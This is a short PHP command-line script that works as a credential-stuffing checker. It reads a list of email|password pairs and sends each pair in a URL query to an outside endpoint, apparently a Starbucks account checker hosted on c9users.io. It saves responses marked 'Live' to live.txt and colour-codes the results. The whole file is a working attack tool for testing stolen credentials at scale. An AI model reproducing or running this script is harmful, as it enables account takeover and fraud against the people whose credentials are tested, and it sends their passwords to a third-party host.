<?php
if(empty($argv[1])) exit("File Not Found!");
$file = file_get_contents($argv[1]);
$data = explode("\n",$file);
for($a=0;$a<count($data);$a++){
        $data1 = explode("|",$data[$a]);
        $email = $data1[0];
        $pass = $data1[1];
        $cek = @file_get_contents("https://php-erisspratama.c9users.io/sbux.php?a=$email&b=$pass");
        if(strpos($cek,"Live | ")==true){
                if(!in_array($cek,explode("\n",@file_get_contents("live.txt")))){
                        $h=fopen("live.txt","a+");
                        fwrite($h,$cek."\n");
                        fclose($h);
                }
                $cek = "\033[32m".$cek."\033[0m";
        }else{
                $cek = "\033[31m".$cek."\033[0m";
        }
        print("[$a/".count($data)."] ".$cek."\n");
}